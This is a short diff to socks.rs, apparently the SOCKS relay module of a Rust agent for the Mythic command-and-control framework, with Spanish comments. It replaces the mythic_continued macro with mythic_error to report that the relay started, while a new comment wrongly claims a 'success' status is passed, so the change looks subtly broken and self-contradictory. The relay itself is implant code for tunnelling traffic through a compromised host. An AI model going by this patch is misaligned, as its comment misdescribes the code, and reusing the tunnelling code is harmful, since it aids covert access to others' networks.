@@ -1,6 +1,6 @@
 // socks.rs
 use crate::agent::AgentTask;
-use crate::mythic_continued;
+use crate::mythic_error;  // ← USA mythic_error EN LUGAR DE mythic_continued
 use base64::{engine::general_purpose::STANDARD, Engine};
 use serde::Deserialize;
 use std::error::Error;
@@ -33,13 +33,16 @@ impl SocksState {
 // Asegúrate de que start_socks esté definida correctamente
 pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
+    
+    // Usa mythic_error con status "success" para indicar éxito
+    tx.send(mythic_error!(task.id, "SOCKS relay started"))?;
 
     let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(relay_loop(tx.clone(), rx));
     Ok(())
 }
 
+// ... el resto del código de socks.rs permanece igual
 async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, mut rx: mpsc::Receiver<serde_json::Value>) {
     while let Ok(msg) = rx.recv() {
         if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
